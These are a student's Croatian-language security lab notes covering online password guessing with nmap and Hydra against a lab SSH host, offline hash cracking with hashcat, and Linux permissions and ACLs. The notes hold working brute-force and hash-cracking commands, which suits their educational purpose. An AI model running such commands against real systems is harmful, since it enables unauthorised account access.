# Labovi SRP

# 5.Laboratorijska vježba

21.12.2021./11.01.2022.

## **Online and Offline Password Guessing Attacks**

Radili smo napad na lokalni Docker container korisničkim imenom i odgovarajućom lozinkom. Lozinka se treba otkriti i to se može napraviti na dva načna. Prvi način je online - napadamo direktno koristeći korisničko ime i ip adresu te je korišten online "riječnik" te drugi način offline - napad na lokalno spremljeni hash lozinke korisnika.

## **Online Password Guessing**

Koristimo *nmap*, alat koji skenira mrežu i na njoj otkriva ***host*ove i servise** tako što **šalje pakete** i **analizira odgovore** na njih.

```jsx
nmap -v 10.0.15.0/28
```

Napad se može izvršiti tako da tražimo kombinaciju po kombinaciju, ali to bi trajalo predugo, zato je profesor sastavio riječnik lozinki i njega smo trebali skinuti.

```jsx
wget -r -nH -np --reject "index.html*" http://a507-server.local:8080/dictionary/g1/
```

Pomoću alata Hydra započinjemo napad. Imamo već sastavljen riječnik i iz njega tražimo lozinku.

```jsx
hydra -l mamic_rosana -x 4:6:a 10.0.15.3 -V -t 1 ssh
```

## Offline Password Guessing

Ovdje se napadaju password hashevi spremljeni na uređaju.

Koristimo hashcat alat.

```jsx
sudo apt-get install hashcat
hashcat
```

Hash smo spremili u txt preko visual code-a

```jsx
code .
```

Pokrećemo napad koristeći riječnik skinut s lokalnog servera.

```jsx
hashcat --force -m 1800 -a 3 hash.txt ?l?l?l?l?l?l --status --status-timer 10
```

# 6.Laboratorijska vježba

11.01.2022.

## **Linux permissions and ACLs**

U ovoj vježbi smo se upoznali s komandama u linuxu za davanje raznih prava različitim datotekama. Svaka datoteka ima vlasnika koji ima svoj User ID. Mora pripadati nekoj grupi, pa tako tu više korisnika može pripadati. Svaka grupa ima svoj ID (GID).

Stvorili smo dva usera - Bob i Alice.

```jsx
sudo adduser alice
```

Trebali smo novom korisniku dati lozinku i sljedeći korak je bio ispis odgovarajućih identifikatora korisnika i grupa kojima pripada.

```jsx
su - Alice
```

Kao Alice smo napravili direktorij novi i tu unijeli security.txt.

```jsx
# navigate to home directory
cd

# create a new directory
mkdir

# create a file with text
echo "Hello world" > security.txt

# print file content
cat security.txt
```

Izlistali smo sve informacije o novom direktoriju i datoteci pomoću:

```jsx
ls -l .
getfacl srp
```

Tu smo se upznali s r(ead) w(rite) dopuštenjima i -(nema dopuštenja)

Ta dopuštenja mogu biti za g(roup) ili u(ser)-a.

Ta dopuštenja se mogu oduzimati i dodavati.

```jsx
# Remove (u)ser (r)ead permission
chmod u-r security.txt

# Add (u)ser (r)ead permission
chmod u+r security.txt

# Remove both (u)ser and (g)roup (w)rite permission
chmod ug-w security.txt

# Add (u)ser (w)rite and remove (g)roup (r)ead permission
chmod u+w,g-r security.txt

# Add (u)ser (r)read, (w)rite permissions and remove e(x)ecute permpission
chmod u=rw security.txt
```

Oduzeli smo pravo pristupa datoteci `security.txt` vlasniku datoteke na način da u tom postupku **ne odzimamo `(r)ead` dopuštenje nad datotekom**.

```jsx
chmod u-x .
```

Oduzeli smo prava pristupu Bobu i opet ih vratili.

Kada su u istoj grupi imaju ista prava.

Izbacili smo iz grupe korisnika.

```jsx
# gpasswd -d <user> <group>
gpasswd -d bob alice
gpasswd -d bob shadow
```

Upoznali smo se s real effective i saved UID-ovima i to je slično read write execute dopuštenjima. Otvorili smo u Pythonu ovaj kod.

```jsx
import os

print('Real (R), effective (E) and saved (S) UIDs:') 
print(os.getresuid())

with open('/home/alice/srp/security.txt', 'r') as f:
    print(f.read())
```